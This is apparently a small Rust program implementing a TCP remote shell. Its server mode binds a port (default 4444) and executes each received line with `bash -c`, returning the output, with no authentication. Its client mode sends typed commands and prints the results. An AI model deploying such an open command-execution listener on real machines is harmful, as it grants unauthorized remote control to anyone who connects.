use clap::{Parser, Subcommand};
use core::str;
use defaults::*;
use std::process::Command;
use std::{
    io::{self, stdin, BufRead, BufReader, BufWriter, Write},
    net::{IpAddr, SocketAddr, TcpListener, TcpStream},
};

mod defaults {
    pub const DEFAULT_IP_ADDR: &str = "127.0.0.1";
    pub const DEFAULT_PORT: u16 = 4444;
}

#[derive(Parser, Debug)]
struct Args {
    #[clap(subcommand)]
    mode: OperationMode,

    /// If client, IP address to connect to. If server, IP address to bind to.
    #[clap(short, long, default_value = DEFAULT_IP_ADDR, global = true)]
    address: IpAddr,

    /// If client, port to connect to. If server, port to bind to
    #[clap(short, long, default_value_t = DEFAULT_PORT, global = true)]
    port: u16,
}

#[derive(Subcommand, Debug)]
enum OperationMode {
    Server,
    Client,
}

fn main() {
    let Args {
        mode,
        address,
        port,
    } = Args::parse();

    let socket_address = SocketAddr::new(address, port);
    match mode {
        OperationMode::Client => match start_client(socket_address.clone()) {
            Ok(_) => println!("Client started"),
            Err(_) => println!("Failed to start client"),
        },
        OperationMode::Server => match start_server(socket_address.clone()) {
            Ok(_) => println!("Server started"),
            Err(_) => println!("Failed to start server"),
        },
    }
}

fn start_client(socket_address: SocketAddr) -> io::Result<()> {
    let stream = TcpStream::connect(&socket_address)?;
    let (mut reader, mut writer) = (BufReader::new(&stream), BufWriter::new(&stream));

    loop {
        let outgoing = {
            let mut input = String::new();
            stdin().read_line(&mut input)?;
            input.as_bytes().to_vec()
        };

        writer.write(&outgoing)?;
        writer.flush()?;

        let incoming = {
            let mut it = vec![];
            reader.read_until(b'\r', &mut it)?;
            it
        };

        println!("{}", String::from_utf8_lossy(&incoming));
    }
}

fn start_server(socket_address: SocketAddr) -> io::Result<()> {
    let listener = TcpListener::bind(&socket_address)?;
    let (stream, _) = listener.accept()?;
    let (mut reader, mut writer) = (BufReader::new(&stream), BufWriter::new(&stream));

    loop {
        let mut incoming: Vec<u8> = vec![];
        let num_bytes_read = reader.read_until(b'\n', &mut incoming)?;

        // Check for EOF (stream closed)
        if num_bytes_read == 0 {
            return Ok(());
        }

        let command = String::from_utf8_lossy(&incoming).trim().to_string();
        let output = Command::new("bash").arg("-c").arg(command).output();

        match output {
            Ok(output) => {
                let (stdout, stderr) = (output.stdout, output.stderr);

                let mut outgoing = Vec::new();
                if !stdout.is_empty() {
                    outgoing = stdout.clone();
                }

                if !stderr.is_empty() {
                    outgoing = stderr.clone();
                }

                outgoing.push(b'\r'); // To signal end of output
                writer.write(&outgoing)?;
                writer.flush()?;
            }
            Err(e) => {
                println!("Error: {}", e);
            }
        }
    }
}
